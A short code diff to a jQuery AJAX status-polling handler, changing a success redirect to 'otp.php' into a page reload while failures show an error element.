@@ -39,7 +39,7 @@
       data: {"method":"getStatus"},
       success:function(data){
         if (data.result.status == "success") {
-          window.location.href = "otp.php";
+          window.location.reload();
         } else if (data.result.status == "failed") {
           $("#wrong").show();
           $("#loader").hide();
